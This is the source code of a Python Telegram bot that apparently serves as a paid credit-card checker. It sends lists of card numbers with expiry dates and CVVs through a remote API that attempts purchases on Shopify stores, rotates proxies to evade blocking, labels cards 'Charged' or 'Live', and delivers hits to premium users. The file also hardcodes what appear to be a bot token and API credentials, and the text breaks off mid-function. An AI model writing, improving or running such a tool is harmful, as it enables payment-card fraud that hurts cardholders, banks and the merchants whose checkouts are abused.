import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime
from telethon import TelegramClient, events, Button

CHECKER_API_URL = 'https://afuona.up.railway.app/shopify'

API_ID = 37235723
API_HASH = '880a876edaf529c8493b873d47821ec2'
BOT_TOKEN = '8331950390:AAHX5V8JZ6jeJTZZHE7wAFswbdla-oIAogQ'
ADMIN_IDS = [7077294261]

def is_admin(user_id):
    return user_id in ADMIN_IDS

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
WELCOME_IMAGE_PATH = 'afuona.jpg'

PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159",
    "❌": "5121063440311386962",
    "🔥": "5116414868357907335",
    "⚡": "5219943216781995020",
    "💳": "5447453226498552490",
    "💠": "5870498447068502918",
    "📝": "5444860552310457690",
    "🌐": "5447602197439218445",
    "📊": "4911241630633165627",
    "📦": "5303102515301083665",
    "📋": "5305618829265628111",
    "⏳": "5303382628773161521",
    "🚀": "5303534082204920602",
    "⚠️": "5305473345838410805",
    "💎": "5305726937887433606",
    "👋": "5134653266591744867",
    "💡": "5231264265242954153",
    "📈": "5134457377428341766",
    "🔢": "5305652587708572354",
    "🔌": "5305622454218024328",
    "⭐": "5801104080646444587",
    "🆓": "5116382939571028928",
    "👑": "5303547611351902889",
    "🔍": "5305346287820895195",
    "⏱️": "5303243514782443814",
    "💥": "5122933683820430249",
    "🆔": "5447311106030726740",
    "👤": "5445174334031166029",
    "📅": "5082628525303792441",
    "🔄": "5454245266305604993",
    "🏦": "5303159080020372094",
    "🥰": "5881784744949062058",
    "😱": "5868517294618975202",
    "💰": "5303159080020372094",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji, 
            f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>'
        )
    return result

active_sessions = {}
user_main_menu = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'invalid proxy format', 'no proxy',
)

def get_main_menu_keyboard():
    return [
        [Button.inline("𝗖𝗺𝗱", b"show_commands", style="success")],
        [Button.url("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", "https://t.me/ccscrapharshOp", style="success")]
    ]

def get_commands_keyboard():
    return [
        [Button.inline(" 𝗕𝗮𝗰𝗸", b"main_menu",style="danger")]
    ]

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def save_sites(sites):
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def save_proxies(proxies):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

async def get_user_stats_text(user_id, username):
    user_file = f"user_{user_id}.json"
    user_data = {}
    if os.path.exists(user_file):
        with open(user_file, 'r', encoding='utf-8') as f:
            user_data = json.load(f)
    
    total_checks = user_data.get('total_checks', 0)
    successful_checks = user_data.get('successful_checks', 0)
    sites_count = len(load_sites())
    proxies_count = len(load_proxies())
    
    if is_premium(user_id):
        expiry = user_data.get('premium_expiry', '')
        if expiry:
            try:
                expiry_date = datetime.fromisoformat(expiry)
                days_left = (expiry_date - datetime.now()).days
                plan = f"⭐{days_left} days"
            except:
                plan = "⭐"
        else:
            plan = "⭐"
    else:
        plan = "🆓"
    
    text = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 , @{username}!\n\n"
    text += f" 𝗔𝗰𝗰𝗼𝘂𝗻𝘁   🚀 \n\n"
    text += f"    ┣ 📝 𝗣𝗹𝗮𝗻 {plan}\n"
    text += f"    ┣ 🌐 𝗦𝗶𝘁𝗲𝘀  {sites_count}\n"
    text += f"    ┣ 🔌 𝗣𝗿𝗼𝘅𝗶𝗲𝘀  {proxies_count}\n"  
    text += f"    ┣ 💥 𝗛𝗶𝘁𝘀{successful_checks}\n"
    text += f"    ┗ 📈 𝗧𝗼𝘁𝗮𝗹 {total_checks}\n\n\n"
    text += f"💡 𝗠𝗮𝗱𝗲 𝗯𝘆: @CARDINGxHARSH"
    
    return text

async def save_user_stats(user_id, was_successful=False):
    user_file = f"user_{user_id}.json"
    user_data = {}
    if os.path.exists(user_file):
        with open(user_file, 'r', encoding='utf-8') as f:
            user_data = json.load(f)
    
    user_data['total_checks'] = user_data.get('total_checks', 0) + 1
    if was_successful:
        user_data['successful_checks'] = user_data.get('successful_checks', 0) + 1
    
    with open(user_file, 'w', encoding='utf-8') as f:
        json.dump(user_data, f, indent=2)

async def create_user_if_not_exists(user_id, username):
    user_file = f"user_{user_id}.json"
    if not os.path.exists(user_file):
        user_data = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0,
            'successful_checks': 0,
            'premium': False,
            'premium_expiry': None
        }
        with open(user_file, 'w', encoding='utf-8') as f:
            json.dump(user_data, f, indent=2)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {
            'cc': card,
            'site': site,
            'proxy': proxy
        }
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', 'shopiii')
        status = raw.get('Status', False)

        response_lower = str(response_msg).lower()

        # Charged conditions (full)
        if status is True or 'order placed' in response_lower or 'order_completed' in response_lower or 'order completed' in response_lower or '💎' in response_msg or 'payment successful' in response_lower or 'thank you' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        # Approved conditions (full)
        elif 'approved' in response_lower or 'insufficient_funds' in response_lower or 'insufficient' in response_lower or 'invalid_cvv' in response_lower or 'incorrect_cvv' in response_lower or 'invalid_cvc' in response_lower or 'incorrect_cvc' in response_lower or 'invalid cvv' in response_lower or 'incorrect cvv' in response_lower or 'invalid cvc' in response_lower or 'incorrect cvc' in response_lower or 'incorrect_zip' in response_lower or 'incorrect zip' in response_lower or 'cvv' in response_lower:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = raw.get('Response', '').lower()
        status = raw.get('Status', False)
        
        if status is True or 'order placed' in response_msg or 'order_completed' in response_msg:
            return {'site': site, 'status': 'alive'}
        else:
            return {'site': site, 'status': 'dead'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = raw.get('Response', '').lower()
        status = raw.get('Status', False)
        
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        elif status is True or 'order placed' in response_msg:
            return {'proxy': proxy, 'status': 'alive'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    message = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭 /b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    progress_text = f"""
<b>💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡ CC CHECKER RESULTS \n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    await create_user_if_not_exists(user_id, username)
    stats_text = await get_user_stats_text(user_id, username)
    
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(
            premium_emoji(stats_text),
            file=WELCOME_IMAGE_PATH,
            buttons=get_main_menu_keyboard(),
            parse_mode='html'
        )
    else:
        await event.reply(
            premium_emoji(stats_text),
            buttons=get_main_menu_keyboard(),
            parse_mode='html'
        )

@bot.on(events.CallbackQuery)
async def handle_menu_callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if data == "show_commands":
        commands_text = """<b>📋 BASIC COMMANDS</b>
├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show help
├ <code>/profile</code> - View your profile
└ <code>/mysites</code> - View your sites

<b>🌐 SITE MANAGEMENT</b>
├ <code>/site domain</code> - Add a site
├ <code>/sitecheck</code> - Check all sites & remove dead
└ <code>/rmsite url</code> - Remove a specific site

<b>💳 CARD CHECKING</b>
├ <code>/cc card|mm|yy|cvv</code> - Check single card
├ <code>/chk</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>🔌 PROXY MANAGEMENT</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/rmproxyindex 1,2,3</code> - Remove by index
├ <code>/clearproxy</code> - Remove all proxies
└ <code>/getproxy</code> - Get all proxies

<b>📝 FORMATS</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""
        
        await event.edit(
            premium_emoji(commands_text),
            buttons=get_commands_keyboard(),
            parse_mode='html'
        )
        await event.answer()
    
    elif data == "main_menu":
        stats_text = await get_user_stats_text(user_id, username)
        
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.delete()
            await event.respond(
                premium_emoji(stats_text),
                file=WELCOME_IMAGE_PATH,
                buttons=get_main_menu_keyboard(),
                parse_mode='html'
            )
        else:
            await event.edit(
                premium_emoji(stats_text),
                buttons=get_main_menu_keyboard(),
                parse_mode='html'
            )
        await event.answer()
    
    elif data == "refresh_stats":
        stats_text = await get_user_stats_text(user_id, username)
        
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.delete()
            await event.respond(
                premium_emoji(stats_text),
                file=WELCOME_IMAGE_PATH,
                buttons=get_main_menu_keyboard(),
                parse_mode='html'
            )
        else:
            await event.edit(
                premium_emoji(stats_text),
                buttons=get_main_menu_keyboard(),
                parse_mode='html'
            )
        await event.answer("🔄 Stats refreshed!")

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    
    help_text = """<b>📋 User Commands:</b>

├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show this help
├ <code>/profile</code> - View your profile
├ <code>/mysites</code> - View your sites

<b>🌐 Site Management:</b>
├ <code>/site domain [proxy]</code> - Add a site
├ <code>/sitecheck</code> - Check all sites & remove dead
└ <code>/rmsite url</code> - Remove a specific site

<b>💳 Card Checking:</b>
├ <code>/cc cc|mm|yy|cvv [proxy]</code> - Check single card
├ <code>/chk [proxy]</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>🔌 Proxy Management:</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/rmproxyindex 1,2,3</code> - Remove by index
├ <code>/clearproxy</code> - Remove all proxies
└ <code>/getproxy</code> - Get all proxies

<b>📝 Formats:</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""

    if is_admin(user_id):
        help_text += """

<b>👑 Admin Commands:</b>
├ <code>/addpremium user_id</code> - Add premium user
├ <code>/removepremium user_id</code> - Remove premium user
├ <code>/premiumlist</code> - List all premium users
└ <code>/id</code> - Get your user ID"""
    
    await event.reply(premium_emoji(help_text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/profile'))
async def profile_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    
    user_file = f"user_{user_id}.json"
    user_data = {}
    if os.path.exists(user_file):
        with open(user_file, 'r', encoding='utf-8') as f:
            user_data = json.load(f)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"
    
    total_checks = user_data.get('total_checks', 0)
    successful_checks = user_data.get('successful_checks', 0)
    registered_at = user_data.get('registered_at', datetime.now().isoformat())[:10]
    
    if is_premium(user_id):
        premium_status = "✅ Yes"
    else:
        premium_status = "❌ No"
    
    text = f"""<b>👤 Profile</b>

├ 🆔 User ID: <code>{user_id}</code>
├ 👤 Name: {first_name}
├ 📝 Username: @{username}
├ 📊 Total Checks: {total_checks}
├ 💥 Hits: {successful_checks}
├ 🌐 Sites Added: {len(load_sites())}
├ ⭐ Premium: {premium_status}
└ 📅 Registered: {registered_at}"""
    
    await event.reply(premium_emoji(text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    
    sites = load_sites()
    
    if not sites:
        await event.reply(premium_emoji("❌ No sites found."), parse_mode='html')
        return
    
    sites_text = '\n'.join([f"• {site}" for site in sites])
    
    if len(sites_text) > 4000:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            await f.write('\n'.join(sites))
        
        await event.reply(
            premium_emoji(f"📋 <b>Your sites ({len(sites)}):</b>"),
            file=filename,
            parse_mode='html'
        )
        
        try:
            os.remove(filename)
        except:
            pass
    else:
        await event.reply(
            premium_emoji(f"📋 <b>Your sites:</b>\n\n{sites_text}"),
            buttons=get_commands_keyboard(),
            parse_mode='html'
        )

@bot.on(events.NewMessage(pattern=r'^/site\s+'))
async def add_site_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/site https://domain.com</code>"), parse_mode='html')
        return
    
    site = args[1].strip()
    site = site.replace('https://', '').replace('http://', '').rstrip('/')
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available to test site."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔄 Testing site: {site}..."), parse_mode='html')
    
    proxy = random.choice(proxies)
    result = await test_site(site, proxy)
    
    if result['status'] == 'alive':
        current_sites = load_sites()
        if site not in current_sites:
            async with aiofiles.open(SITES_FILE, 'a') as f:
                await f.write(f"{site}\n")
            await status_msg.edit(premium_emoji(f"✅ <b>Site added successfully!</b>\n\n{site}"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"⚠️ <b>Site already exists:</b> {site}"), parse_mode='html')
    else:
        await status_msg.edit(premium_emoji(f"❌ <b>Could not add site!</b>\n\nSite appears to be dead or unreachable."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/rmsite https://domain.com</code>"), parse_mode='html')
        return
    
    url_to_remove = args[1].strip()
    current_sites = load_sites()
    
    if url_to_remove not in current_sites:
        await event.reply(premium_emoji(f"❌ Site not found: {url_to_remove}"), parse_mode='html')
        return
    
    new_sites = [site for site in current_sites if site != url_to_remove]
    save_sites(new_sites)
    
    await event.reply(premium_emoji(f"✅ <b>Site removed successfully!</b>\n\n{url_to_remove}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sitecheck'))
async def site_check_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return
    
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ No sites to check."), parse_mode='html')
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i + batch_size]
        fresh_proxies = load_proxies()
        if not fresh_proxies:
            fresh_proxies = proxies
        
        tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res['status'] == 'alive':
                alive_sites.append(res['site'])
            else:
                dead_sites.append(res['site'])
        
        await status_msg.edit(
            premium_emoji(
                f"🔥 Checking sites...\n\n"
                f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                f"<b>Alive:</b> {len(alive_sites)}\n"
                f"<b>Dead:</b> {len(dead_sites)}"
            ),
            parse_mode='html'
        )
    
    save_sites(alive_sites)
    
    summary = f"""✅ <b>Site Check Complete!</b>

<b>Total Sites:</b> {len(sites)}
<b>Alive:</b> {len(alive_sites)}
<b>Removed:</b> {len(dead_sites)}

<code>sites.txt</code> has been updated with only working sites."""
    
    await status_msg.edit(premium_emoji(summary), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mcancel'))
async def cancel_check_command(event):
    user_id = event.sender_id
    
    canceled = False
    for session_key in list(active_sessions.keys()):
        if session_key.startswith(f"{user_id}_"):
            del active_sessions[session_key]
            canceled = True
    
    if canceled:
        await event.reply(premium_emoji("✅ <b>Mass check cancelled!</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ No mass check in progress"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    status_msg = await event.reply(
        premium_emoji(f"<b>⚡ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        ),
        parse_mode='html'
    )

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        await save_user_stats(user_id, was_successful=(result['status'] in ['Charged', 'Approved']))

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝐋𝐢𝐯𝐞"
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐞𝐚𝐝"

        final_resp = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
